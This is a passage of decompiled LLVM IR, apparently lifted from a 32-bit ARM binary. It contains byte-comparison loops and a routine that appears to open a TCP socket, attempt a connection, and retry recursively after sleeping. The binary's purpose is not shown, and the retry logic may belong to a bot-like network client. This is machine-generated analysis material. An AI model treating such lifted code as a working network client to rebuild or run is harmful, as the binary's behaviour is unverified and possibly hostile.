  %v1_db28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db24

dec_label_pc_da78:                                ; preds = %dec_label_pc_db1c.backedge, %dec_label_pc_da5c
  store i32 %v2_d5a4, i32* %r2.global-to-local, align 4
  %v3_da7c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_da7c, i32* @r5, align 4
  %v5_da84 = icmp slt i32 %v0_dae4107, %v3_da7c
  br i1 %v5_da84, label %dec_label_pc_da94, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_da78
  %v1_db5081 = add i32 %v0_dae4107, -1
  store i32 %v1_db5081, i32* %r1.global-to-local, align 4
  %v2_db5082 = icmp eq i32 %v0_dae4107, 0
  br i1 %v2_db5082, label %dec_label_pc_da94, label %dec_label_pc_db58.lr.ph

dec_label_pc_db58.lr.ph:                          ; preds = %.thread28
  %v0_db58.pre = load i32, i32* @sl, align 4
  %v1_db5c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db58

dec_label_pc_da94:                                ; preds = %dec_label_pc_db50.backedge, %.thread28, %dec_label_pc_da78
  store i32 %v2_d5a4, i32* %r3.global-to-local, align 4
  %v3_da98 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_da98, i32* @r5, align 4
  %v5_daa0 = icmp slt i32 %v0_dae4107, %v3_da98
  br i1 %v5_daa0, label %dec_label_pc_dab0, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_da94
  %v1_db8490 = add i32 %v0_dae4107, -1
  store i32 %v1_db8490, i32* %r1.global-to-local, align 4
  %v2_db8491 = icmp eq i32 %v0_dae4107, 0
  br i1 %v2_db8491, label %dec_label_pc_dab0, label %dec_label_pc_db8c.lr.ph

dec_label_pc_db8c.lr.ph:                          ; preds = %.thread37
  %v0_db8c.pre = load i32, i32* @sb, align 4
  %v1_db90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db8c

dec_label_pc_dab0:                                ; preds = %dec_label_pc_db84.backedge, %.thread37, %dec_label_pc_da94
  %v3_dab4 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_dab4, i32* @r5, align 4
  %v5_dabc = icmp slt i32 %v0_dae4107, %v3_dab4
  br i1 %v5_dabc, label %dec_label_pc_dacc, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_dab0
  %v1_dbb899 = add i32 %v0_dae4107, -1
  store i32 %v1_dbb899, i32* %r1.global-to-local, align 4
  %v2_dbb8100 = icmp eq i32 %v0_dae4107, 0
  br i1 %v2_dbb8100, label %dec_label_pc_dacc, label %dec_label_pc_dbc0.lr.ph

dec_label_pc_dbc0.lr.ph:                          ; preds = %.thread46
  %v0_dbc0.pre = load i32, i32* @fp, align 4
  %v1_dbc4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dbc0

dec_label_pc_dacc:                                ; preds = %dec_label_pc_dbb8.backedge, %.thread46, %dec_label_pc_dab0
  store i32 %v2_d5a4, i32* %r1.global-to-local, align 4
  %v3_dad0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_dad0, i32* @lr, align 4
  %v5_dad8 = icmp slt i32 %v0_dae4107, %v3_dad0
  br i1 %v5_dad8, label %dec_label_pc_da44.backedge, label %.thread52

dec_label_pc_da44.backedge:                       ; preds = %dec_label_pc_db04, %.thread52, %dec_label_pc_dacc
  store i32 %v2_da40, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_da50 = call i32 @function_103a0(i32 %v2_d9a4)
  %tmp226 = icmp slt i32 %v1_da50, 1
  br i1 %tmp226, label %dec_label_pc_dc58, label %dec_label_pc_da5c

.thread52:                                        ; preds = %dec_label_pc_dacc
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_dae4109 = icmp eq i32 %v0_dae4107, 0
  br i1 %v2_dae4109, label %dec_label_pc_da44.backedge, label %dec_label_pc_daec.lr.ph

dec_label_pc_daec.lr.ph:                          ; preds = %.thread52
  %v1_daf4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_daec

dec_label_pc_daec:                                ; preds = %dec_label_pc_db04, %dec_label_pc_daec.lr.ph
  %v0_dae4.in = phi i32 [ %v0_dae4107, %dec_label_pc_daec.lr.ph ], [ %v0_dae4, %dec_label_pc_db04 ]
  %v0_db04 = phi i32 [ 0, %dec_label_pc_daec.lr.ph ], [ %v1_db04, %dec_label_pc_db04 ]
  %v1_daf0 = phi i32 [ 0, %dec_label_pc_daec.lr.ph ], [ %v1_daf0174, %dec_label_pc_db04 ]
  %v0_dae4 = add i32 %v0_dae4.in, -1
  store i32 %v3_da34, i32* %r3.global-to-local, align 4
  %v2_daf0 = add i32 %v1_daf0, %v3_da34
  %v3_daf0 = inttoptr i32 %v2_daf0 to i8*
  %v4_daf0 = load i8, i8* %v3_daf0, align 1
  %v6_daf0 = zext i8 %v4_daf0 to i32
  store i32 %v6_daf0, i32* %r2.global-to-local, align 4
  %v2_daf4 = add i32 %v0_db04, %v1_daf4.pre
  %v3_daf4 = inttoptr i32 %v2_daf4 to i8*
  %v4_daf4 = load i8, i8* %v3_daf4, align 1
  %v6_daf4 = zext i8 %v4_daf4 to i32
  store i32 %v6_daf4, i32* %r3.global-to-local, align 4
  %v9_daf8 = icmp eq i8 %v4_daf4, %v4_daf0
  br i1 %v9_daf8, label %dec_label_pc_dbdc, label %bb227

bb227:                                            ; preds = %dec_label_pc_daec
  br label %dec_label_pc_db04

dec_label_pc_db04:                                ; preds = %bb227, %dec_label_pc_dbdc
  %v1_daf0174 = phi i32 [ %v1_dbdc, %dec_label_pc_dbdc ], [ 0, %bb227 ]
  %v1_db04 = add i32 %v0_db04, 1
  store i32 %v1_db04, i32* %r1.global-to-local, align 4
  %v2_dae4 = icmp eq i32 %v0_dae4, 0
  br i1 %v2_dae4, label %dec_label_pc_da44.backedge, label %dec_label_pc_daec

dec_label_pc_db0c:                                ; preds = %dec_label_pc_db24
  %v1_db0c = add i32 %v1_db24, 1
  store i32 %v1_db0c, i32* @lr, align 4
  %v9_db10 = icmp eq i32 %v3_da60, %v1_db0c
  br i1 %v9_db10, label %dec_label_pc_dbe8, label %dec_label_pc_db1c.backedge

dec_label_pc_db1c.backedge:                       ; preds = %dec_label_pc_db0c, %dec_label_pc_db38
  %v1_db24139 = phi i32 [ 0, %dec_label_pc_db38 ], [ %v1_db0c, %dec_label_pc_db0c ]
  %storemerge127 = add i32 %storemerge127.in, 1
  %v1_db1c = add i32 %v0_db1c, -1
  store i32 %v1_db1c, i32* %r1.global-to-local, align 4
  %v2_db1c = icmp eq i32 %v0_db1c, 0
  br i1 %v2_db1c, label %dec_label_pc_da78, label %dec_label_pc_db24

dec_label_pc_db24:                                ; preds = %dec_label_pc_db1c.backedge, %dec_label_pc_db24.lr.ph
  %v0_db1c = phi i32 [ %v1_db1c72, %dec_label_pc_db24.lr.ph ], [ %v1_db1c, %dec_label_pc_db1c.backedge ]
  %storemerge127.in = phi i32 [ 0, %dec_label_pc_db24.lr.ph ], [ %storemerge127, %dec_label_pc_db1c.backedge ]
  %v1_db24 = phi i32 [ 0, %dec_label_pc_db24.lr.ph ], [ %v1_db24139, %dec_label_pc_db1c.backedge ]
  %v2_db24 = add i32 %v1_db24, %v0_db24.pre
  %v3_db24 = inttoptr i32 %v2_db24 to i8*
  %v4_db24 = load i8, i8* %v3_db24, align 1
  %v6_db24 = zext i8 %v4_db24 to i32
  store i32 %v6_db24, i32* %r2.global-to-local, align 4
  %v2_db28 = add i32 %storemerge127.in, %v1_db28.pre
  %v3_db28 = inttoptr i32 %v2_db28 to i8*
  %v4_db28 = load i8, i8* %v3_db28, align 1
  %v6_db28 = zext i8 %v4_db28 to i32
  store i32 %v6_db28, i32* %r3.global-to-local, align 4
  %v9_db2c = icmp eq i8 %v4_db28, %v4_db24
  br i1 %v9_db2c, label %dec_label_pc_db0c, label %dec_label_pc_db38

dec_label_pc_db38:                                ; preds = %dec_label_pc_db24
  br label %dec_label_pc_db1c.backedge

dec_label_pc_db40:                                ; preds = %dec_label_pc_db58
  %v1_db40 = add i32 %v1_db58, 1
  store i32 %v1_db40, i32* @lr, align 4
  %v9_db44 = icmp eq i32 %v3_da7c, %v1_db40
  br i1 %v9_db44, label %dec_label_pc_dbe8, label %dec_label_pc_db50.backedge

dec_label_pc_db50.backedge:                       ; preds = %dec_label_pc_db40, %dec_label_pc_db6c
  %v1_db58148 = phi i32 [ 0, %dec_label_pc_db6c ], [ %v1_db40, %dec_label_pc_db40 ]
  %storemerge126 = add i32 %storemerge126.in, 1
  %v1_db50 = add i32 %v0_db50, -1
  store i32 %v1_db50, i32* %r1.global-to-local, align 4
  %v2_db50 = icmp eq i32 %v0_db50, 0
  br i1 %v2_db50, label %dec_label_pc_da94, label %dec_label_pc_db58

dec_label_pc_db58:                                ; preds = %dec_label_pc_db50.backedge, %dec_label_pc_db58.lr.ph
  %v0_db50 = phi i32 [ %v1_db5081, %dec_label_pc_db58.lr.ph ], [ %v1_db50, %dec_label_pc_db50.backedge ]
  %storemerge126.in = phi i32 [ 0, %dec_label_pc_db58.lr.ph ], [ %storemerge126, %dec_label_pc_db50.backedge ]
  %v1_db58 = phi i32 [ 0, %dec_label_pc_db58.lr.ph ], [ %v1_db58148, %dec_label_pc_db50.backedge ]
  %v2_db58 = add i32 %v1_db58, %v0_db58.pre
  %v3_db58 = inttoptr i32 %v2_db58 to i8*
  %v4_db58 = load i8, i8* %v3_db58, align 1
  %v6_db58 = zext i8 %v4_db58 to i32
  store i32 %v6_db58, i32* %r2.global-to-local, align 4
  %v2_db5c = add i32 %storemerge126.in, %v1_db5c.pre
  %v3_db5c = inttoptr i32 %v2_db5c to i8*
  %v4_db5c = load i8, i8* %v3_db5c, align 1
  %v6_db5c = zext i8 %v4_db5c to i32
  store i32 %v6_db5c, i32* %r3.global-to-local, align 4
  %v9_db60 = icmp eq i8 %v4_db5c, %v4_db58
  br i1 %v9_db60, label %dec_label_pc_db40, label %dec_label_pc_db6c

dec_label_pc_db6c:                                ; preds = %dec_label_pc_db58
  br label %dec_label_pc_db50.backedge

dec_label_pc_db74:                                ; preds = %dec_label_pc_db8c
  %v1_db74 = add i32 %v1_db8c, 1
  store i32 %v1_db74, i32* @lr, align 4
  %v9_db78 = icmp eq i32 %v3_da98, %v1_db74
  br i1 %v9_db78, label %dec_label_pc_dbe8, label %dec_label_pc_db84.backedge

dec_label_pc_db84.backedge:                       ; preds = %dec_label_pc_db74, %dec_label_pc_dba0
  %v1_db8c157 = phi i32 [ 0, %dec_label_pc_dba0 ], [ %v1_db74, %dec_label_pc_db74 ]
  %storemerge125 = add i32 %storemerge125.in, 1
  %v1_db84 = add i32 %v0_db84, -1
  store i32 %v1_db84, i32* %r1.global-to-local, align 4
  %v2_db84 = icmp eq i32 %v0_db84, 0
  br i1 %v2_db84, label %dec_label_pc_dab0, label %dec_label_pc_db8c

dec_label_pc_db8c:                                ; preds = %dec_label_pc_db84.backedge, %dec_label_pc_db8c.lr.ph
  %v0_db84 = phi i32 [ %v1_db8490, %dec_label_pc_db8c.lr.ph ], [ %v1_db84, %dec_label_pc_db84.backedge ]
  %storemerge125.in = phi i32 [ 0, %dec_label_pc_db8c.lr.ph ], [ %storemerge125, %dec_label_pc_db84.backedge ]
  %v1_db8c = phi i32 [ 0, %dec_label_pc_db8c.lr.ph ], [ %v1_db8c157, %dec_label_pc_db84.backedge ]
  %v2_db8c = add i32 %v1_db8c, %v0_db8c.pre
  %v3_db8c = inttoptr i32 %v2_db8c to i8*
  %v4_db8c = load i8, i8* %v3_db8c, align 1
  %v6_db8c = zext i8 %v4_db8c to i32
  store i32 %v6_db8c, i32* %r2.global-to-local, align 4
  %v2_db90 = add i32 %storemerge125.in, %v1_db90.pre
  %v3_db90 = inttoptr i32 %v2_db90 to i8*
  %v4_db90 = load i8, i8* %v3_db90, align 1
  %v6_db90 = zext i8 %v4_db90 to i32
  store i32 %v6_db90, i32* %r3.global-to-local, align 4
  %v9_db94 = icmp eq i8 %v4_db90, %v4_db8c
  br i1 %v9_db94, label %dec_label_pc_db74, label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_db8c
  br label %dec_label_pc_db84.backedge

dec_label_pc_dba8:                                ; preds = %dec_label_pc_dbc0
  %v1_dba8 = add i32 %v1_dbc0, 1
  store i32 %v1_dba8, i32* @lr, align 4
  %v9_dbac = icmp eq i32 %v3_dab4, %v1_dba8
  br i1 %v9_dbac, label %dec_label_pc_dbe8, label %dec_label_pc_dbb8.backedge

dec_label_pc_dbb8.backedge:                       ; preds = %dec_label_pc_dba8, %dec_label_pc_dbd4
  %v1_dbc0166 = phi i32 [ 0, %dec_label_pc_dbd4 ], [ %v1_dba8, %dec_label_pc_dba8 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_dbb8 = add i32 %v0_dbb8, -1
  store i32 %v1_dbb8, i32* %r1.global-to-local, align 4
  %v2_dbb8 = icmp eq i32 %v0_dbb8, 0
  br i1 %v2_dbb8, label %dec_label_pc_dacc, label %dec_label_pc_dbc0

dec_label_pc_dbc0:                                ; preds = %dec_label_pc_dbb8.backedge, %dec_label_pc_dbc0.lr.ph
  %v0_dbb8 = phi i32 [ %v1_dbb899, %dec_label_pc_dbc0.lr.ph ], [ %v1_dbb8, %dec_label_pc_dbb8.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_dbc0.lr.ph ], [ %storemerge, %dec_label_pc_dbb8.backedge ]
  %v1_dbc0 = phi i32 [ 0, %dec_label_pc_dbc0.lr.ph ], [ %v1_dbc0166, %dec_label_pc_dbb8.backedge ]
  %v2_dbc0 = add i32 %v1_dbc0, %v0_dbc0.pre
  %v3_dbc0 = inttoptr i32 %v2_dbc0 to i8*
  %v4_dbc0 = load i8, i8* %v3_dbc0, align 1
  %v6_dbc0 = zext i8 %v4_dbc0 to i32
  store i32 %v6_dbc0, i32* %r2.global-to-local, align 4
  %v2_dbc4 = add i32 %storemerge.in, %v1_dbc4.pre
  %v3_dbc4 = inttoptr i32 %v2_dbc4 to i8*
  %v4_dbc4 = load i8, i8* %v3_dbc4, align 1
  %v6_dbc4 = zext i8 %v4_dbc4 to i32
  store i32 %v6_dbc4, i32* %r3.global-to-local, align 4
  %v9_dbc8 = icmp eq i8 %v4_dbc4, %v4_dbc0
  br i1 %v9_dbc8, label %dec_label_pc_dba8, label %dec_label_pc_dbd4

dec_label_pc_dbd4:                                ; preds = %dec_label_pc_dbc0
  br label %dec_label_pc_dbb8.backedge

dec_label_pc_dbdc:                                ; preds = %dec_label_pc_daec
  %v1_dbdc = add i32 %v1_daf0, 1
  %v9_dbe0 = icmp eq i32 %v3_dad0, %v1_dbdc
  br i1 %v9_dbe0, label %dec_label_pc_dbe8, label %dec_label_pc_db04

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_db0c, %dec_label_pc_db40, %dec_label_pc_db74, %dec_label_pc_dba8, %dec_label_pc_dbdc
  %v1_dbec = call i32 @function_f00c(i32 12)
  %v1_dbf4 = call i32 @function_f00c(i32 13)
  %v1_dbfc = call i32 @function_f00c(i32 14)
  %v1_dc04 = call i32 @function_f00c(i32 15)
  %v1_dc0c = call i32 @function_f00c(i32 16)
  %v1_dc14 = call i32 @function_10608(i32 %v2_d9a4)
  %v0_dc18 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_dc20 = call i32 @function_103d4(i32 %v0_dc18, i32 9)
  br label %dec_label_pc_dc24

dec_label_pc_dc24:                                ; preds = %dec_label_pc_d998, %dec_label_pc_dc58, %dec_label_pc_dbe8
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_dc30 = call i32 @function_f9d0(i32 %v2_d820, i32 64)
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_dc40 = call i32 @function_f9d0(i32 %v2_d870, i32 64)
  %v1_dc48 = call i32 @function_126fc(i32 1)
  store i32 %v2_d7f4, i32* @r4, align 4
  %v0_dc50 = load i32, i32* @r7, align 4
  store i32 %v0_dc50, i32* @r5, align 4
  br label %dec_label_pc_d744.backedge

dec_label_pc_dc58:                                ; preds = %dec_label_pc_da44.backedge, %dec_label_pc_d9b4
  %v1_dc5c = call i32 @function_f00c(i32 12)
  %v1_dc64 = call i32 @function_f00c(i32 13)
  %v1_dc6c = call i32 @function_f00c(i32 14)
  %v1_dc74 = call i32 @function_f00c(i32 15)
  %v1_dc7c = call i32 @function_f00c(i32 16)
  %v1_dc84 = call i32 @function_10608(i32 %v2_d9a4)
  br label %dec_label_pc_dc24

; uselistorder directives
  uselistorder i32 %v1_dbdc, { 1, 0 }
  uselistorder i32 %v1_db04, { 1, 0 }
  uselistorder i32 %v1_daf0, { 1, 0 }
  uselistorder i32 %v0_db04, { 1, 0 }
  uselistorder i32 %v1_da50, { 1, 0 }
  uselistorder i32 %v2_d9a4, { 3, 2, 4, 1, 0 }
  uselistorder i1 %v7_d97c, { 1, 0 }
  uselistorder i32 %v2_d978, { 1, 0 }
  uselistorder i32 %v2_d748, { 1, 0 }
  uselistorder i32 %stack_var_-8428.1.be, { 1, 0 }
  uselistorder i32 %v3_d8d0, { 1, 2, 0 }
  uselistorder i32 %v2_d7d8, { 1, 0 }
  uselistorder i32 %v1_d778, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d754, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8428.0, { 1, 0 }
  uselistorder i32 %v2_da40, { 1, 0, 2 }
  uselistorder i32 %v2_d870, { 1, 0, 2, 3 }
  uselistorder i32 %v2_d820, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_d708, { 1, 0 }
  uselistorder i32 %v3_d6ec, { 1, 0 }
  uselistorder i32 %v2_d6b8, { 2, 0, 1 }
  uselistorder i32 %v1_d654, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_d5d4, { 1, 2, 0 }
  uselistorder i32 %storemerge184, { 1, 0 }
  uselistorder i32 %v0_d568, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 9, 8, 53, 12, 10, 0, 55, 54, 52, 11, 1, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder i32 (i8*, i32, i32)* @function_fc8c, { 0, 1, 2, 19, 20, 21, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32*)* @function_10948, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @function_10804, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1036c, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_20604.89, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_dc24, { 1, 2, 0 }
  uselistorder label %dec_label_pc_dbe8, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_dbb8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_db84.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_db50.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_db1c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_db04, { 1, 0 }
  uselistorder label %dec_label_pc_da5c, { 1, 0 }
  uselistorder label %dec_label_pc_d998, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d744.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d92c, { 1, 0 }
  uselistorder label %dec_label_pc_d754, { 1, 0 }
  uselistorder label %dec_label_pc_d754.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_d600, { 1, 0 }
}

define i32 @function_dc9c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_dc9c:
  store i32 ptrtoint (i32* @global_var_de18.93 to i32), i32* inttoptr (i32 123888 to i32*), align 16
  ret i32 %arg1
}

define i32 @function_dcb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_dcb4:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_dcb4 = load i32, i32* @r7, align 4
  %v15_dcb4 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_dcd0 = call i32 @function_10df0(i32 2, i32 1, i32 0)
  store i32 %v3_dcd0, i32* %r0.global-to-local, align 4
  store i32 123880, i32* @r6, align 4
  %v7_dcd8 = icmp eq i32 %v3_dcd0, -1
  store i32 %v3_dcd0, i32* inttoptr (i32 123880 to i32*), align 8
  br i1 %v7_dcd8, label %dec_label_pc_dcb4.dec_label_pc_dd90_crit_edge, label %dec_label_pc_dce4

dec_label_pc_dcb4.dec_label_pc_dd90_crit_edge:    ; preds = %dec_label_pc_dcb4
  %v1_dd98.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dd90

dec_label_pc_dce4:                                ; preds = %dec_label_pc_dcb4
  %v2_dce4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_dce4, i32* @r3, align 4
  %v0_dce8 = load i32, i32* @r4, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  %v0_dcf8 = load i32, i32* %r0.global-to-local, align 4
  %v5_dcf8 = call i32 @function_10dac(i32 %v0_dcf8, i32 %v0_dce8, i32 2, i32 %v2_dce4, i32 4)
  store i32 %v5_dcf8, i32* %r0.global-to-local, align 4
  %v0_dcfc = load i32, i32* @r6, align 4
  %v1_dcfc = inttoptr i32 %v0_dcfc to i32*
  %v2_dcfc = load i32, i32* %v1_dcfc, align 4
  store i32 %v2_dcfc, i32* %r0.global-to-local, align 4
  %v2_dd0c = call i32 @function_1043c(i32 %v2_dcfc, i32 3)
  %v0_dd10 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_dcfc, i32* %r0.global-to-local, align 4
  %v2_dd1c = call i32 @function_1043c(i32 %v2_dcfc, i32 %v0_dd10)
  store i32 %v2_dd1c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @1 to i32), i32* @r8, align 4
  %v0_dd4c = call i32 @function_10a30()
  store i32 %v0_dd4c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v2_dd54 = inttoptr i32 %v0_dd4c to i32*
  store i32 0, i32* %v2_dd54, align 4
  %v2_dd58 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_dd58, i32* @r5, align 4
  store i32 %v0_dd4c, i32* @r4, align 4
  %v0_dd68 = load i32, i32* @r6, align 4
  %v1_dd68 = inttoptr i32 %v0_dd68 to i32*
  %v2_dd68 = load i32, i32* %v1_dd68, align 4
  store i32 %v2_dd68, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_dd74 = call i32 @function_10ba0(i32 %v2_dd68, i32 %v2_dd58, i32 16)
  store i32 %v3_dd74, i32* %r0.global-to-local, align 4
  %v7_dd78 = icmp eq i32 %v3_dd74, -1
  br i1 %v7_dd78, label %dec_label_pc_dd9c, label %dec_label_pc_dd80

dec_label_pc_dd80:                                ; preds = %dec_label_pc_dce4
  %v2_dd88 = load i32, i32* inttoptr (i32 123880 to i32*), align 8
  store i32 %v2_dd88, i32* %r0.global-to-local, align 4
  %v2_dd8c = call i32 @function_10c8c(i32 %v2_dd88, i32 1)
  store i32 %v2_dd8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dd90

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dcb4.dec_label_pc_dd90_crit_edge, %dec_label_pc_dda8, %dec_label_pc_dd80
  %v1_dd98 = phi i32 [ %v1_dd98.pre, %dec_label_pc_dcb4.dec_label_pc_dd90_crit_edge ], [ %v1_ddf0, %dec_label_pc_dda8 ], [ %v2_dd8c, %dec_label_pc_dd80 ]
  store i32 %v12_dcb4, i32* @r7, align 4
  store i32 %v15_dcb4, i32* @r8, align 4
  ret i32 %v1_dd98

dec_label_pc_dd9c:                                ; preds = %dec_label_pc_dce4
  %v0_dd9c = load i32, i32* @r4, align 4
  %v1_dd9c = inttoptr i32 %v0_dd9c to i32*
  %v2_dd9c = load i32, i32* %v1_dd9c, align 4
  %v7_dda0 = icmp eq i32 %v2_dd9c, 99
  br i1 %v7_dda0, label %dec_label_pc_ddf8, label %dec_label_pc_dda8

dec_label_pc_dda8:                                ; preds = %dec_label_pc_ddf8, %bb, %dec_label_pc_dd9c
  %v0_ddc0 = load i32, i32* @r6, align 4
  %v1_ddc0 = inttoptr i32 %v0_ddc0 to i32*
  %v2_ddc0 = load i32, i32* %v1_ddc0, align 4
  store i32 %v2_ddc0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_ddd0 = call i32 @function_10bd8(i32 %v2_ddc0, i32 %v2_dd58, i32 16)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_ddd8 = call i32 @function_126fc(i32 5)
  store i32 %v1_ddd8, i32* %r0.global-to-local, align 4
  %v0_dddc = load i32, i32* @r6, align 4
  %v1_dddc = inttoptr i32 %v0_dddc to i32*
  %v2_dddc = load i32, i32* %v1_dddc, align 4
  store i32 %v2_dddc, i32* %r0.global-to-local, align 4
  %v1_dde0 = call i32 @function_10608(i32 %v2_dddc)
  store i32 58811, i32* %r0.global-to-local, align 4
  %v1_ddec = call i32 @function_cfe8(i32 58811)
  store i32 %v1_ddec, i32* %r0.global-to-local, align 4
  %v1_ddf0 = call i32 @function_dcb4(i32 %v1_ddec)
  store i32 %v1_ddf0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dd90

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_dd9c
  %v0_ddf8 = load i32, i32* @r8, align 4
  %v1_ddf8 = inttoptr i32 %v0_ddf8 to i8*
  %v2_ddf8 = load i8, i8* %v1_ddf8, align 1
  %v3_ddf8 = zext i8 %v2_ddf8 to i32
  %v1_ddfc = load i32, i32* @r7, align 4
  %v9_ddfc = icmp eq i32 %v3_ddf8, %v1_ddfc
  br i1 %v9_ddfc, label %dec_label_pc_dda8, label %bb

bb:                                               ; preds = %dec_label_pc_ddf8
  %v2_de04 = trunc i32 %v1_ddfc to i8
  store i8 %v2_de04, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @1, i32 0, i32 0), align 1
  br label %dec_label_pc_dda8

; uselistorder directives
  uselistorder i32 %v1_ddf0, { 1, 0 }
  uselistorder i32 %v2_dd58, { 1, 0, 2 }
  uselistorder i32 %v2_dcfc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_dcd0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 8, 7, 10, 9, 11, 13, 12, 14, 15, 18, 17, 19, 16 }
  uselistorder i32 (i32)* @function_cfe8, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10c8c, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10ba0, { 2, 1, 0 }
  uselistorder [4 x i8]* @1, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_10dac, { 7, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32* inttoptr (i32 123880 to i32*), { 1, 0 }
  uselistorder label %dec_label_pc_dda8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dd90, { 1, 2, 0 }
}

define i32 @function_de0c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_de0c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_de0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_de0c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_de0c
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_de0c = load i32, i32* @r8, align 4
  %v3_de0c = udiv i32 %v2_de0c, 128
  %v4_de0c = mul i32 %v2_de0c, 33554432
  %v5_de0c = or i32 %v3_de0c, %v4_de0c
  %v8_de0c = and i32 %v5_de0c, %tmp
  store i32 %v8_de0c, i32* %arg2, align 4
  %v2_de14 = load i32, i32* %r0.global-to-local, align 4
  %v5_de14 = mul i32 %v2_de14, 4096
  %v6_de14 = and i32 %v5_de14, %arg3
  store i32 %v6_de14, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_de0c, %bb
  %v7_de14 = phi i32 [ %arg1, %dec_label_pc_de0c ], [ %v6_de14, %bb ]
  ret i32 %v7_de14

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_de18(i32 %arg1) local_unnamed_addr {
dec_label_pc_de18:
  %v1_de20 = call i32 @function_f0ac(i32 3)
